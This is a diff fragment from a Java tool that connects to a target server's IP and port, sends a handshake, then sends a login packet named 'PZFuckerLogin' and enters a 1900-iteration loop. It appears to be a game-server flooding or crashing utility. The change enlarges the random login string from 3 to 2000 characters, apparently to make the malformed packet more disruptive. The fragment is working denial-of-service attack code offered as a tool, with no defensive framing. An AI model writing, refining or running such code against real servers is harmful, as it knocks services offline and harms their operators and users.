@@ -244,7 +244,7 @@ public class Methods {
 			}
 			sock.connect(new InetSocketAddress((String)data.get("IP"), (int)data.get("Port")));
 			DataOutputStream out = new DataOutputStream(sock.getOutputStream());
-			String str = RandomStringUtils.random((int)3, true, true);
+			String str = RandomStringUtils.random((int)2000, true, true);
 			PacketUtils.writePacket(out, PacketUtils.createHandshakePacket((String)data.get("IP"), (int)data.get("Port"), (int)data.get("Protocol")));
 			PacketUtils.writePacket(out, PacketUtils.createPZFuckerLogin(str));
 			for ( int x = 0 ; x < 1900 ; x++ ){
